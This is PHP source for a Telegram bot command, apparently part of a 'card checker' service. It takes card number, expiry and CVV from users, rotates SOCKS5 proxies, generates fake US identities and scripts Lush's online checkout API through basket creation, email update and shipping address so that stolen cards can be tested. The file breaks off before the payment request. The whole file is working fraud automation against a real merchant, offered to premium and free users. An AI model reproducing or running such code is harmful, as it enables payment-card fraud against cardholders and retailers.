<?php
list($cmd) = explode(" ", $message);
if($cmd == "/3d" or $cmd == ".3d" or $cmd == "!3d"){
include '/CurlX.php';
$NameGater ='Rosaria';
$gateway = '/3d :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate 3D: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>3D Adyen</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!3d card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";


AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate 3D: >_ $-3D Adyen
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();
$retry = 0;

start:
    
if($retry > 7)
{
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Error Token Site</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}

$rotate = rotate();
$socks5 = socks5();
$url = "https://api.ipify.org/"; 
       
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_PROXY,$socks5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$rotate); 
$ip1 = curl_exec($ch); 
curl_close($ch); 
ob_flush(); 
if (isset($ip1)) { 
  $ip = "Live"; 
} 
if (empty($ip1)) { 
    bot('editMessageText',[
        'chat_id'=>$chatId,
        'message_id'=>$messageidtoedit,
        'text'=>"<b>The Proxy is Dead Report and Please Be Patience</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id]);
    die();
}


if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.lush.com/api/basket/create');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: text/plain;charset=UTF-8';
$headers[] = 'Origin: https://www.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"channel":"us","language":"EN_US","quantity":1,"variantId":"UHJvZHVjdFZhcmlhbnQ6MTg1NDc="}');
$curl = curl_exec($ch);
$checkoutToken = getStr($curl, '"checkoutToken":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.lush.com/api/gateway');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://www.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"checkout","variables":{"token":"'.$checkoutToken.'","languageCode":"EN_US","channelAddress":{"country":"US"}},"query":"fragment Address on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment ShippingMethod on ShippingMethod {\n  id\n  name\n  price {\n    ...Money\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  __typename\n}\n\nfragment Money on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment MetadataItem on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment ProductVariant on ProductVariant {\n  id\n  name\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  sku\n  weight {\n    ...Weight\n    __typename\n  }\n  pricing(address: $channelAddress) {\n    ...VariantPricingInfo\n    __typename\n  }\n  attributes {\n    attribute {\n      inputType\n      slug\n      metadata {\n        ...MetadataItem\n        __typename\n      }\n      name\n      __typename\n    }\n    values {\n      reference\n      id\n      name\n      richText\n      translation(languageCode: $languageCode) {\n        ...AttributeValueTranslation\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Product on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    ...Translation\n    __typename\n  }\n  pricing(address: $channelAddress) {\n    ...Pricing\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    __typename\n  }\n  thumbnail {\n    ...Thumbnail\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  category {\n    ...ProductCategory\n    __typename\n  }\n  attributes {\n    ...ProductAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment TaxedMoney on TaxedMoney {\n  currency\n  gross {\n    ...Money\n    __typename\n  }\n  net {\n    ...Money\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingInfo on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoney\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nfragment Thumbnail on Image {\n  url\n  alt\n  __typename\n}\n\nfragment CheckoutLine on CheckoutLine {\n  id\n  quantity\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  variant {\n    ...ProductVariant\n    product {\n      ...Product\n      variants {\n        ...ProductVariant\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ProductAttribute on SelectedAttribute {\n  attribute {\n    id\n    name\n    slug\n    inputType\n    entityType\n    metadata {\n      value\n      key\n      __typename\n    }\n    __typename\n  }\n  values {\n    slug\n    boolean\n    file {\n      url\n      contentType\n      __typename\n    }\n    reference\n    id\n    name\n    richText\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Translation on ProductTranslation {\n  id\n  name\n  description\n  seoDescription\n  seoTitle\n  language {\n    code\n    language\n    __typename\n  }\n  __typename\n}\n\nfragment Pricing on ProductPricingInfo {\n  onSale\n  priceRangeUndiscounted {\n    start {\n      ...TaxedMoney\n      __typename\n    }\n    __typename\n  }\n  priceRange {\n    start {\n      ...TaxedMoney\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ProductCategory on Category {\n  id\n  name\n  translation(languageCode: $languageCode) {\n    id\n    name\n    __typename\n  }\n  __typename\n}\n\nfragment Weight on Weight {\n  value\n  __typename\n}\n\nfragment AttributeValueTranslation on AttributeValueTranslation {\n  id\n  name\n  richText\n  __typename\n}\n\nquery checkout($token: UUID!, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkout(token: $token) {\n    id\n    created\n    lastChange\n    token\n    quantity\n    email\n    shippingAddress {\n      ...Address\n      __typename\n    }\n    shippingMethod {\n      ...ShippingMethod\n      __typename\n    }\n    metadata {\n      ...MetadataItem\n      __typename\n    }\n    lines {\n      ...CheckoutLine\n      __typename\n    }\n    shippingPrice {\n      ...TaxedMoney\n      __typename\n    }\n    subtotalPrice {\n      ...TaxedMoney\n      __typename\n    }\n    totalPrice {\n      ...TaxedMoney\n      __typename\n    }\n    voucherCode\n    discount {\n      ...Money\n      __typename\n    }\n    __typename\n  }\n}"}]');
$curl = curl_exec($ch);
$id = getStr($curl, '"id":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/us/en_us');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/graphql');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"checkoutEmailUpdate","variables":{"languageCode":"EN_US","channelAddress":{"country":"US"},"id":"'.$id.'","email":"'.$email.'"},"query":"fragment Warehouse on Warehouse {\n  id\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  name\n  slug\n  email\n  clickAndCollectOption\n  address {\n    ...Address\n    __typename\n  }\n  __typename\n}\n\nfragment MetadataItem on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment Address on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment Money on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment TaxedMoney on TaxedMoney {\n  currency\n  gross {\n    ...Money\n    __typename\n  }\n  tax {\n    ...Money\n    __typename\n  }\n  net {\n    ...Money\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedAttribute on SelectedAttribute {\n  attribute {\n    name\n    id\n    slug\n    inputType\n    __typename\n  }\n  values {\n    name\n    id\n    slug\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Product on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    seoDescription\n    seoTitle\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    name\n    __typename\n  }\n  thumbnail {\n    url\n    alt\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  category {\n    id\n    name\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment ProductVariant on ProductVariant {\n  id\n  name\n  sku\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  pricing {\n    ...VariantPricingInfo\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutLine on CheckoutLine {\n  id\n  quantity\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  variant {\n    ...ProductVariant\n    product {\n      ...Product\n      variants {\n        ...ProductVariant\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingInfo on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoney\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingMethod on ShippingMethod {\n  id\n  name\n  description\n  price {\n    ...Money\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  message\n  active\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  __typename\n}\n\nfragment Checkout on Checkout {\n  id\n  created\n  lastChange\n  token\n  quantity\n  email\n  channel {\n    id\n    slug\n    __typename\n  }\n  isShippingRequired\n  voucherCode\n  discount {\n    ...Money\n    __typename\n  }\n  billingAddress {\n    ...Address\n    __typename\n  }\n  shippingAddress {\n    ...Address\n    __typename\n  }\n  shippingMethod {\n    ...ShippingMethod\n    __typename\n  }\n  shippingMethods {\n    ...ShippingMethod\n    __typename\n  }\n  availableCollectionPoints {\n    ...Warehouse\n    __typename\n  }\n  deliveryMethod {\n    ...Warehouse\n    __typename\n  }\n  availablePaymentGateways {\n    name\n    id\n    config {\n      value\n      field\n      __typename\n    }\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  lines {\n    ...CheckoutLine\n    __typename\n  }\n  shippingPrice {\n    ...TaxedMoney\n    __typename\n  }\n  subtotalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nmutation checkoutEmailUpdate($id: ID!, $email: String!, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkoutEmailUpdate(id: $id, email: $email) {\n    checkout {\n      ...Checkout\n      __typename\n    }\n    errors {\n      message\n      field\n      code\n      __typename\n    }\n    __typename\n  }\n}"}]');
$curl = curl_exec($ch);


//$form_key = (getStr($curl, '<input name="form_key" type="hidden" value="', '"'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/graphql');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"checkoutShippingAddressUpdate","variables":{"languageCode":"EN_US","channelAddress":{"country":"US"},"id":"'.$id.'","shippingAddress":{"firstName":"'.$firstname.'","lastName":"'.$lastname.'","phone":"7253428323","country":"US","city":"Owings Mills","companyName":"","streetAddress1":"1 Stretham Ct","streetAddress2":"","countryArea":"MD","postalCode":"21117-4739"}},"query":"fragment Warehouse on Warehouse {\n  id\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  name\n  slug\n  email\n  clickAndCollectOption\n  address {\n    ...Address\n    __typename\n  }\n  __typename\n}\n\nfragment MetadataItem on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment Address on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment Money on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment TaxedMoney on TaxedMoney {\n  currency\n  gross {\n    ...Money\n    __typename\n  }\n  tax {\n    ...Money\n    __typename\n  }\n  net {\n    ...Money\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedAttribute on SelectedAttribute {\n  attribute {\n    name\n    id\n    slug\n    inputType\n    __typename\n  }\n  values {\n    name\n    id\n    slug\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Product on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    seoDescription\n    seoTitle\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    name\n    __typename\n  }\n  thumbnail {\n    url\n    alt\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  category {\n    id\n    name\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment ProductVariant on ProductVariant {\n  id\n  name\n  sku\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  pricing {\n    ...VariantPricingInfo\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutLine on CheckoutLine {\n  id\n  quantity\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  variant {\n    ...ProductVariant\n    product {\n      ...Product\n      variants {\n        ...ProductVariant\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingInfo on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoney\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingMethod on ShippingMethod {\n  id\n  name\n  description\n  price {\n    ...Money\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  message\n  active\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  __typename\n}\n\nfragment Checkout on Checkout {\n  id\n  created\n  lastChange\n  token\n  quantity\n  email\n  channel {\n    id\n    slug\n    __typename\n  }\n  isShippingRequired\n  voucherCode\n  discount {\n    ...Money\n    __typename\n  }\n  billingAddress {\n    ...Address\n    __typename\n  }\n  shippingAddress {\n    ...Address\n    __typename\n  }\n  shippingMethod {\n    ...ShippingMethod\n    __typename\n  }\n  shippingMethods {\n    ...ShippingMethod\n    __typename\n  }\n  availableCollectionPoints {\n    ...Warehouse\n    __typename\n  }\n  deliveryMethod {\n    ...Warehouse\n    __typename\n  }\n  availablePaymentGateways {\n    name\n    id\n    config {\n      value\n      field\n      __typename\n    }\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  lines {\n    ...CheckoutLine\n    __typename\n  }\n  shippingPrice {\n    ...TaxedMoney\n    __typename\n  }\n  subtotalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nmutation checkoutShippingAddressUpdate($id: ID!, $shippingAddress: AddressInput!, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkoutShippingAddressUpdate(id: $id, shippingAddress: $shippingAddress) {\n    checkout {\n      ...Checkout\n      __typename\n    }\n    errors {\n      message\n      field\n      code\n      __typename\n    }\n    __typename\n  }\n}"}]');
$curl = curl_exec($ch);
$ShippingMethod = (getStr($curl, '"active":true,"metadata":[],"__typename":"ShippingMethod"},{"id":"', '"'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/graphql');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
